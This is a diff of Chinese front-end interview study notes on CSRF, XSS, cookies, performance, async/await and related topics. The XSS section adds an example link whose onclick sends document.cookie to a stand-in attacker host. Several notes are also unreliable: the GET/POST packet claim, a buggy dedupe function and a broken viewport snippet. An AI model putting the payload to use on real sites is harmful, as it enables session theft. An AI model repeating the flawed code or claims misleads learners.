@@ -1,5 +1,5 @@
 ---
-title: 常用面试问题记录与分析
+`title: 常用面试问题记录与分析
 ---
 
 # interview
@@ -663,20 +663,36 @@ js的下载和执行会阻塞之后所有资源的下载
 * **csrf (跨站请求伪造)**
 
   * 在用户注册过的网站A登录过, 并下发cookie
-  * 在恶意网站诱导用户点击网站A的链接(接口存在漏洞)
+  * 在恶意网站B诱导用户点击目标网站A的链接(接口存在漏洞), 或者恶意网站存在指向目标网站A的链接(iframe 或者 image)。
+  * 当用户在打开了A网站的同时访问了B， 因为B中有含有A的链接， 此时A的cookie将被发送
 
-  防御: 
+  **防御:** 
 
   * token验证
   * referer验证, 请求是否从可信站点发起
 
 * **xss(跨域脚本攻击)**
 
-  * 向页面注入脚本
+  * **定义**：XSS 攻击， 通常指 黑客 通过“ HTML 注入” 篡改 了 网页， 插入 了 恶意 的 脚本， 从而 在用 户 浏览 网页 时， 控制 用户 浏览器 的 一种 攻击。
 
-  防御:
+  * **危害**：XSS 攻击 带来 的 不光 是 Cookie 劫持 问题， 还有 窃取 用户 信息、 模拟 用户 身份 执行 操作 等 诸多 严重 的 后果。
 
+  * **例如**：
+
+    * 用户通过提交表单等， 向页面注入恶意脚本
+
+    * 在页面插入恶意脚本， 进行cookie劫持
+
+      ```html
+      <a href=# onclick=\”document.location=\’http://attacker-site.com/xss_collect?m=\’+escape\(document.cookie\)\;\”>快看, 这里有美女在洗澡</a>
+      ```
+
+  **防御**:
+
+  * 给cookie增加http only的属性 （客户端无法通过document.cookie获取到）， 该方法并非全面防御xss，仅防御cookie劫持
   * 过滤用户输入
+  * 检查输出
+  * 定时更换sessionid
 
 ##### 算法
 
@@ -815,7 +831,9 @@ js的下载和执行会阻塞之后所有资源的下载
 
 #### 页面性能
 
-* **提升页面性能的方法?**
+* **整个前端性能提升分为哪几类，分别列出提升页面性能的方法?**
+
+  资源请求类（压缩合并请求，按需请求）， 资源缓存类， js算法类（动画， 递归等）
 
   * **资源压缩合并, 减少http请求**
 
@@ -1122,13 +1140,377 @@ js的下载和执行会阻塞之后所有资源的下载
 
 
 
+### Tips
+
+* **找到数组里面最小的数 (es5 / es6)**
+
+  ```js
+  // es6
+  Math.min(...arr)
+  // es5 1.for循环 2.sort后取第一项
+  ```
+
+* **数组去重非indexOf(使用对象， 空间换取时间, 因为object在js中是以hash实现的， 访问键值比遍历数组更快)**
+
+  ```js
+  const arr = [1,2,3,3]
+  function unique(arr) {
+      let ret = []
+      let table = {}
+      arr.forEach(item => {
+          if (table[JSON.stringify(item)]) {
+              return
+          } else {
+              table[item] = true
+              ret.push(item)
+          }
+      })
+      return ret
+  }
+  
+  // 字符串去重
+  [...new Set('aabbcde')].join('') // abcde
+  ```
+
+* **html表单可以跨域吗？**
+
+  可以 
+
+  因为原页面用 form 提交到另一个域名之后，原页面的脚本无法获取新页面中的内容。
+
+  所以浏览器认为这是安全的。
+
+  而 AJAX 是可以读取响应内容的，因此浏览器不能允许你这样做。
+
+  如果你细心的话你会发现，其实请求已经发送出去了，你只是拿不到响应而已
+
+* **get和post请求的本质区别**
+
+  get只发送一个tcp包， 而post发送两个
+
+* **搜索请求中文如何请求**
+
+  get请求使用URL编码`encodeURI`并接受ASCII编码字符, post请求对格式无要求
+
+* **观察者和订阅-发布的区别，各自用在哪里**
+
+  ![发布订阅/观察者](./imgs/observer-pubSub.png)
+
+  * 观察者模式：一个对象（称为subject）维持一系列依赖于它的对象（称为observer），将有关状态的任何变更自动通知给它们（观察者）。
+
+  * 发布/订阅模式：基于一个主题/事件通道，希望接收通知的对象（称为subscriber）通过自定义事件订阅主题，被激活事件的对象（称为publisher）通过发布主题事件的方式被通知。
+
+    两种模式都存在订阅者和发布者（具体观察者可认为是订阅者、具体目标可认为是发布者），但是观察者模式是由具体目标调度的，而发布/订阅模式是统一由调度中心调的，所以观察者模式的订阅者与发布者之间是存在依赖的，而发布/订阅模式则不会
+
+* **介绍中介者模式**
+
+  用一个中介对象来封装一系列的对象交互。中介者使得各个对象不需要显示地相互引用，从而使其耦合松散，而且可以独立的改变它们之间的交互
+
+  * 现实应用: 电脑主板， 房产中介
+  * 软件应用: MVC架构下的Controller， JQuery对象对内是个中介者， 对外是个单例
+
+* **介绍粘性定位 position: sticky**
+
+  [demo](https://codepen.io/zexiplus/pen/zydVKR)
+
+  ```css
+  .title {
+      position: sticky;
+      top: 10px;
+  }
+  ```
+
+  在 viewport 视口滚动到元素 top 距离小于 10px 之前，元素为相对定位。之后，元素将固定在与顶部距离 10px 的位置，直到 viewport 视口回滚到阈值以下, 必须指定top, left, right, bottom其中之一，否则视为相对定位
+
+* **按需引入是怎么实现的** 例如`import {Button} from 'components' `
+
+  **babel-plugin-component** 把 代码 `import {Button} from 'components' ` 转化为 
+
+  ```js
+  var buton =require('components/lib/button');
+  require('components/lib/button/style.css');
+  ```
+
+* **http报文有哪些部分？**
+
+  起始行(start line)  空行  首部(header)  主体（body）
+
+  ```http
+  HTTP/1.0 200 OK    //起始行
+  
+  Content-type:text/plain    //首部
+  Content-length:19            //首部  
+  
+  Hi I'm a message!    主体
+  ```
+
+* **cookie存放在哪里？能做的事情和存在的价值**
+
+  cookie分为session-cookie(不设置过期时间，存在内存中，关掉浏览器则清空)和thirdpart-cookie(有过期时间，存放在系统硬盘上)
+
+  cookie有效的作用域为当前文件目录以及子目录 `http://abc.com/abc`生成的cookie可以使用在`http://abc.com/abc/123`但不能在`http://abc.com/cde`使用
+
+  * **path**：表示 cookie 影响到的路径，匹配该路径才发送这个 cookie。
+
+  * **expires** 和 maxAge：告诉浏览器这个 cookie 什么时候过期，expires 是 UTC 格式时间，maxAge 是 cookie 多久后过期的相对时间。当不设置这两个选项时，会产生 session cookie，session cookie 是 transient 的，当用户关闭浏览器时，就被清除。一般用来保存 session 的 session_id。
+
+  * **secure**：当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。
+
+  * **httpOnly**：浏览器不允许脚本操作 document.cookie 去更改 cookie。一般情况下都应该设置这个为 true，这样可以避免被 xss 攻击拿到 cookie
+
+* **柯里化函数两端的参数具体是什么东西**
+
+* **服务端渲染SSR**
+
+  Vue.js 是构建客户端应用程序的框架。默认情况下，可以在浏览器中输出 Vue 组件，进行生成 DOM 和操作 DOM。然而，也可以将同一个组件渲染为服务器端的 HTML 字符串，将它们直接发送到浏览器，最后将这些静态标记"激活"为客户端上完全可交互的应用程序。
+
+  服务器渲染的 Vue.js 应用程序也可以被认为是"同构"或"通用"，因为应用程序的大部分代码都可以在服务器和客户端上运行
+
+  **优点：**
+
+  * 更好的 SEO，由于搜索引擎爬虫抓取工具可以直接查看完全渲染的页面
+  * 更快的内容到达时间(time-to-content)，无需等待js下载完成
+
+  **缺点：**
+
+  * 开发条件受限， 例如生命钩子函数只能执行beforeCreated 和 created
+  * 需要nodejs执行环境或至少有javascript解析引擎
+  * 服务器负载更大， 相比静态资源服务器运算量增加
+
+* **移动端适配1px问题**
+
+  * 问题产生的原因:
+
+    css设置`width: 1px`, 在dpr(物理像素与显示像素的比值)为2 的设备上显示 2个物理像素, 如果想设置1个物理像素的宽度, `width: 0.5px`在有些设备上无效
+
+  * 解决方案：
+
+    * 通过dpr(`window.devicePixelRatio`)设置viewport的initialscale
+
+      ```js
+      let dpr = window.devicePixelRatio
+      let scale = 1/dpr
+      let viewportHead = `<meta name="viewport" content="initial-scale=${scale}, maxium-scale=${scale}, user-scalable=no">`
+      document.head.appendChild(viewportHead)
+      ```
+
+    * 通过dpr给元素重写样式
+
+      ```js
+      let dpr = window.devicePixelRatio;
+      if (dpr && dpr > 2) {
+          div.classList.add('dpr2')
+      }
+      ```
+
+      ```css
+      div.dpr2 {
+          transform: scale(50%);
+      }
+      ```
+
+* **webpack常用loader和plugins举例**
+
+  * plugins
+
+    * html-webpack-plugin: html入口生成
+    * clean-webpack-plugin: 清理dist文件
+    * extract-text-webpack-plugin 分离文件
+    * HotModuleReplacementPlugin 热替换
+    * providerPlugin 处理第三方库文件
+
+  * loaders
+
+    * file-loader 处理资源路径
+
+    * style-loader, css-loader, less-loader, scss-loader 处理样式预编译
+
+    * vue-loader 加载编译vue组件
+
+    * babel-loader 转化代码至es5
+
+    * mocha-loader
+
+* **怎么将dom类数组转变为数组**
+
+  ```js
+  var arr = Array.from(document.querySelectorAll('div'))
+  ```
+
+
+
+* **`content-type : multipart/form-data` 和  `application/x-www-form-urlencoded` 有什么区别**
+
+  * `application/x-www-form-urlencoded`： 窗体数据被编码为名称/值对。这是标准的编码格式
+
+  * `multipart/form-data`： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分，这个一般文件上传时用
+
+* **node加载模块(require)的优先级**
+
+  缓存模块 > 原生模块 > 文件模块
+
+
+* **对async、await的理解，内部原理**
+
+  * async, await用法
+
+    ```js
+    async function say(greeting){
+        return new Promise(function(resolve, then){
+            setTimeout(function() {
+                resolve(greeting);
+            },1500);
+        });
+    }
+    
+    (async function(){
+        var v1 = await say('Hello');
+        console.log(v1);
+    
+        var v2 = await say('World');
+        console.log(v2);
+    }());
+    ```
+
+  * yield + promise实现
+
+    ```js
+    function yieldPromise(generator){
+        var iterator=generator();
+        recursiveCore.call(iterator);
+    }
+    
+    function recursiveCore(feedback){
+        var iterator=this,
+            result=iterator.next(feedback);
+    
+        if(result.done){
+            return;
+        }
+    
+        var promise=result.value;
+        Promise.resolve(promise).then(function(v){
+            recursiveCore.call(iterator,v);
+        });
+    }
+    
+    yieldPromise(function*(){
+        var v1 = yield new Promise(function(resolve,reject){
+            setTimeout(function(){
+                resolve('Hello');
+            },1500);
+        });
+    
+        console.warn(v1);
+    
+        var v2 = yield new Promise(function(resolve,reject){
+            setTimeout(function(){
+                resolve('World');
+            },1500);
+        });
+    
+        console.warn(v2);
+    });
+    
+    ```
+
+  * yield 实现
+
+    ```js
+    function yieldContinuation(generator){
+        var iterator = generator();
+        recursiveCore.call(iterator);
+    }
+    
+    function recursiveCore(feedback){
+        var iterator = this,
+            result = iterator.next(feedback);
+    
+        if(result.done){
+            return;
+        }
+    
+        var yieldFunc = result.value;
+        // 传入一个函数作为参数k, 函数参数v相当于k函数的实参
+        yieldFunc(function(v){
+            recursiveCore.call(iterator,v);
+        });
+    }
+    
+    yieldContinuation(function*(){
+        var v1 = yield function(k){
+            setTimeout(function(){
+                k('Hello');
+            },1500);
+        };
+    
+        console.warn(v1);
+    
+        var v2 = yield function(k){
+            setTimeout(function(){
+                k('World');
+            },1500);
+        };
+    
+        console.warn(v2);
+    });
+    
+    ```
+
+
+
+* **什么是浮动， 怎么清除浮动？**
+
+  * 定义： 浮动元素会脱离文档流并向左/向右浮动，直到碰到父元素或者另一个浮动元素
+
+  * 清除： 
+
+    * 使用`clear: both`, 解决父容器高度坍塌
+
+      clear属性不允许被清除浮动的元素的左边/右边挨着浮动元素
+
+      ```html
+      <div class="box-wrapper">
+          <div class="box"></div>
+          <div class="box"></div>
+          <div class="box"></div>
+      </div>
+      ```
+
+      ```css
+      .box {
+      	float: left;
+      }
+      .box-wrapper:after {
+          content: ' ';
+          clear: both;
+      }
+      ```
+
+    * 使用bfc 
+
+      ```css
+      .box-wrapper {
+          overflow: hidden;
+      }
+      ```
+
+* **tcp属于网络协议的那一层哪一层**
+
+  ```css
+  1 物理层 -> 2 数据链路层 -> 3 网络层(ip)-> 4 传输层(tcp) -> 5 应用层(http)
+  ```
+
+
+
+* **什么是纯函数？**
+
+  若一个函数对相同的输入，永远会得到相同的输出，并且**不会影响,引入该函数作用域以外的环境变量**，则此函数称为纯函数 [参考链接](https://www.jianshu.com/p/a9daa1464f9d)
 
 
 
 
-## 补充
 
-补充前面章节缺少的知识点
 
 
 
@@ -1220,7 +1602,7 @@ js的下载和执行会阻塞之后所有资源的下载
 
   Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例
 
-  `Promise.all`方法接受一个数组作为参数，`p1`、`p2`、`p3`都是 Promise 实例，如果不是，就会先调用下面讲到的`Promise.resolve`方法，将参数转为 
+  `Promise.all`方法接受一个数组作为参数，`p1`、`p2`、`p3`都是 Promise 实例，如果不是，就会先调用下面讲到的`Promise.resolve`方法，将参数转为, 该方法返回一个结果数组
 
   （1）只有`p1`、`p2`、`p3`的状态都变成`fulfilled`，`p`的状态才会变成`fulfilled`，此时`p1`、`p2`、`p3`的**返回值组成一个数组**，传递给`p`的回调函数。
 
@@ -1819,7 +2201,7 @@ Vue在mount过程中， template会被编译为AST，经过generate（AST转化�
 
   **服务工作线程**, 服务工作线程是浏览器在后台独立于网页运行的脚本, 包含**推送通知**, 和 **后台同步**等, **拦截和处理网络请求**, 通过程序来**管理缓存中的响应**.
 
-  * 它是一种javascript工作线程, 无法访问dom, 服务工作线程通过响应, postMessage 接口来通信.
+  * 它是一种javascript工作线程, **无法访问dom(没有windows/document对象)**, 服务工作线程通过响应, **postMessage** 接口来通信.
   * 服务工作线程是一种可编程网络代理，让您能够控制页面所发送网络请求的处理方式
   * 它在不用时会被中止，并在下次有需要时重启, 可以访问indexDB API
   * 服务工作线程广泛的使用promise
